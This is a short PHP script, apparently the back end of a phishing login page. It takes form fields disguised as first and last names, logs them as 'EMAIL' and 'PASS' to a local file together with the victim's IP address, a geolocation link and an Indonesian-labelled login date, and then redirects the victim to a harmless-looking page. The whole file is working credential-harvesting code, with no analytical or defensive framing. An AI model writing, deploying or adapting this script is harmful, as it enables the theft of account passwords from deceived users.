<?php
$file = "2023";
$firsname = $_POST['firsname'];
$lastname = $_POST['lastname'];
$country = $_POST['country'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "____________________");
fwrite($handle, "\n");
fwrite($handle, "EMAIL           : ");
fwrite($handle, "$firsname");
fwrite($handle, "\n");
fwrite($handle, "PASS            : ");
fwrite($handle, "$lastname");
fwrite($handle, "\n");
fwrite($handle, "Tanggal Login   : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "https://dnschecker.org/ip-location.php?ip=$ip");
fwrite($handle, "\n");
fwrite($handle, "____________________");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"/home.html?Update\";
// -->
</script>";
?>